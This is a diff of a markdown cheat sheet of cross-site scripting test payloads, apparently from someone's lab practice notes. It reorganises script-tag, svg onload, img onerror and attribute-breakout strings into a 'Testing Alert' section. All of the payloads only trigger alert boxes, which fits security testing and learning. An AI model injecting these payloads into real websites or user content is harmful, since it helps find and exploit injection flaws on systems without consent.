@@ -1,15 +1,18 @@
+### Testing Alert
+```
+<script>alert(1337)</script>
+<svg/ onload=alert(1337)//
+<Svg/OnLoad=(confirm)(1337)<!--
+">cyborg71<script>alert(1337)</script>
+<img src=x onerror=alert(1337)>
+```
 #### For testing.
 ```js
 "><h1>cyborg.71</h1>
-<script>alert(1337)</script>
-<svg/ onload=alert(1337)//
-<Svg/OnLoad=(confirm)(1)<!--
 <script onclick="alert(1337)">
 " onclick="alert(1337)
 " autofocus="alert(1337)
 "onmouseover="alert(1)
-">cyborg71<script>alert(1337)</script> >> DOM XSS in document.write sink using source location.search
-<img src=x onerror=alert('XSS')>
 <a href="javascript:alert('XSS')">Click me</a>
 ```
 ### Reflected XSS into attribute with angle brackets HTML-encoded
